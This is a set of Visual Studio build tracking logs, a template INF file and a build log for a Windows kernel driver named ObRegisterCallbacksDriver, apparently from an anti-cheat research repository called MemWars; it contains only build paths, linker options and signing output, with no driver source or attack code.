#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\4a44c920-cff8-4f2b-9c54-c97aa0f4c2e2\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.6812.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\4a44c920-cff8-4f2b-9c54-c97aa0f4c2e2\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.7124.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\b5a360dc-00e9-4e03-9d78-a5e532b451b6\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.7124.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\b5a360dc-00e9-4e03-9d78-a5e532b451b6\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.9568.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\debfb5c9-a0a5-4366-a41e-b13fa7ec6014\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.9568.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\debfb5c9-a0a5-4366-a41e-b13fa7ec6014\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\c0efd359-a3ef-4449-97c6-7ab15bca6f5e\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\b5a360dc-00e9-4e03-9d78-a5e532b451b6\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\4a44c920-cff8-4f2b-9c54-c97aa0f4c2e2\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\debfb5c9-a0a5-4366-a41e-b13fa7ec6014\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\7904569e-cb09-4e26-9a5a-2f122620dc8f\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\c0efd359-a3ef-4449-97c6-7ab15bca6f5e\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\b5a360dc-00e9-4e03-9d78-a5e532b451b6\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\4a44c920-cff8-4f2b-9c54-c97aa0f4c2e2\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\debfb5c9-a0a5-4366-a41e-b13fa7ec6014\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\7904569e-cb09-4e26-9a5a-2f122620dc8f\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\WINDOWS\MICROSOFT.NET\FRAMEWORK64\V2.0.50727\MSCORWKS.DLL
C:\WINDOWS\MICROSOFT.NET\FRAMEWORK64\V4.0.30319\CLR.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\INF2CAT.EXE
C:\WINDOWS\MICROSOFT.NET\FRAMEWORK64\V4.0.30319\CONFIG\MACHINE.CONFIG
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\MSCORLIB\649C6A53D1A3A182E6EAC793694A733F\MSCORLIB.NI.DLL.AUX
C:\WINDOWS\ASSEMBLY\PUBPOL36.DAT
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.SUBMISSIONBUILDER.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.CATALOGS.DLL
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\SYSTEM\7E7BA461137D6FAF674666F208BB34C2\SYSTEM.NI.DLL.AUX
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\SYSTEM.CORE\6A9FE8D059FF70ADB50F5B340A4AD8EE\SYSTEM.CORE.NI.DLL.AUX
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\SYSTEM.XML\08E8FA67F0A711551A8A00AD6C5880FC\SYSTEM.XML.NI.DLL.AUX
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.CABINETS.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.INFREADER.DLL
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\WINDOWSPROTECTEDFILES.XML
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/link.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
/OUT:"C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS" /VERSION:"10.0" /INCREMENTAL:NO /NOLOGO /WX /SECTION:"INIT,d" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\BUFFEROVERFLOWFASTFAILK.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\NTOSKRNL.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\HAL.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\WMILIB.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFLDR.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFDRIVERENTRY.LIB" /NODEFAULTLIB /MANIFEST:NO /DEBUG:FASTLINK /PDB:"C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.PDB" /SUBSYSTEM:NATIVE,"10.00" /Driver /OPT:REF /OPT:ICF /ENTRY:"FxDriverEntry" /RELEASE /IMPLIB:"C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.LIB" /MERGE:"_TEXT=.text;_PAGE=PAGE" /MACHINE:X64 /PROFILE /guard:cf /INTEGRITYCHECK /kernel /IGNORE:4198,4010,4037,4039,4065,4070,4078,4087,4089,4221,4108,4088,4218,4218,4235 /osversion:10.0 /pdbcompress /debugtype:pdata X64\DEBUG\DRIVER.OBJ

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/link.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\BUFFEROVERFLOWFASTFAILK.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\NTOSKRNL.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\HAL.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\WMILIB.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFLDR.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFDRIVERENTRY.LIB
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\PROGRAM FILES (X86)\MICROSOFT VISUAL STUDIO\2017\PROFESSIONAL\VC\TOOLS\MSVC\14.14.26428\BIN\HOSTX86\X86\MSPDBSRV.EXE
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\PROGRAM FILES (X86)\MICROSOFT VISUAL STUDIO\2017\PROFESSIONAL\VC\TOOLS\MSVC\14.14.26428\BIN\HOSTX86\X64\VCTIP.EXE

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/link.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.PDB

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
sign /ph /sha1 "FDEC11EC1C0B694A1D535297FF9386D964820A6A" 
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
sign /ph /sha1 "FDEC11EC1C0B694A1D535297FF9386D964820A6A" 

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.timestamp.1.tlog`:

```tlog
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS|636711482409555287
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT|636711482475829130

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/stampinf.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
-d "*" -a "amd64" -v "*" -k "1.15"  -x -f x64\Debug\ObRegisterCallbacksDriver.inf -d "*" -a "amd64" -v "*" -k "1.15"  -x C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/stampinf.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/stampinf.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegisterCallbacksDriver.inf`:

```inf
;
; ObRegisterCallbacksDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ObRegisterCallbacksDriver.cat
DriverVer = 08/29/2018,16.3.57.133

[DestinationDirs]
DefaultDestDir = 12
ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ObRegisterCallbacksDriver.sys  = 1,,
;


;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NTamd64

[Standard.NTamd64]
%ObRegisterCallbacksDriver.DeviceDesc%=ObRegisterCallbacksDriver_Device, Root\ObRegisterCallbacksDriver ; TODO: edit hw-id

[ObRegisterCallbacksDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ObRegisterCallbacksDriver.sys

;-------------- Service installation
[ObRegisterCallbacksDriver_Device.NT.Services]
AddService = ObRegisterCallbacksDriver,%SPSVCINST_ASSOCSERVICE%, ObRegisterCallbacksDriver_Service_Inst

; -------------- ObRegisterCallbacksDriver driver install sections
[ObRegisterCallbacksDriver_Service_Inst]
DisplayName    = %ObRegisterCallbacksDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ObRegisterCallbacksDriver.sys

;
;--- ObRegisterCallbacksDriver_Device Coinstaller installation ------
;

[ObRegisterCallbacksDriver_Device.NT.CoInstallers]
AddReg=ObRegisterCallbacksDriver_Device_CoInstaller_AddReg
CopyFiles=ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles

[ObRegisterCallbacksDriver_Device_CoInstaller_AddReg]
;


[ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles]
;


[ObRegisterCallbacksDriver_Device.NT.Wdf]
KmdfService =  ObRegisterCallbacksDriver, ObRegisterCallbacksDriver_wdfsect
[ObRegisterCallbacksDriver_wdfsect]
KmdfLibraryVersion = 1.15

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ObRegisterCallbacksDriver Installation Disk"
ObRegisterCallbacksDriver.DeviceDesc = "ObRegisterCallbacksDriver Device"
ObRegisterCallbacksDriver.SVCDESC = "ObRegisterCallbacksDriver Service"

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegisterCallbacksDriver.log`:

```log
  Building 'ObRegisterCallbacksDriver' with toolset 'WindowsKernelModeDriver10.0' and the 'Universal' target platform.
  Stamping x64\Debug\ObRegisterCallbacksDriver.inf
  Stamping [Version] section with DriverVer=08/29/2018,16.3.57.133
  ObRegisterCallbacksDriver.vcxproj -> C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver.sys
  Done Adding Additional Store
  Successfully signed: C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver.sys
  
  Driver is a Universal Driver.
  .........................
  Signability test complete.
  
  Errors:
  None
  
  Warnings:
  None
  
  Catalog generation complete.
  C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver\obregistercallbacksdriver.cat
  Done Adding Additional Store
  Successfully signed: C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver\obregistercallbacksdriver.cat
  

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/CL.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.CPP
